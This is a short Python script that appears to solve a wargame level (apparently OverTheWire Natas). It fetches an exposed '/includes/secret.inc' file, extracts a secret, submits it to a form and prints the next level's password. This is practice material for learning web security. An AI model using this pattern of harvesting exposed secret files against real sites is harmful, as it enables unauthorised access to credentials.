import config
import os, re
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)
secret_url = url + "/includes/secret.inc"

response = get(secret_url, auth=(user, password))
secret = re.findall(r"\"(\w*)\"", response.content)[0]

response = post(url, auth=(user, password), data={"secret" : secret, "submit" : 1})
password = re.findall(r"\w{32}", response.content)[-1]

print(password)
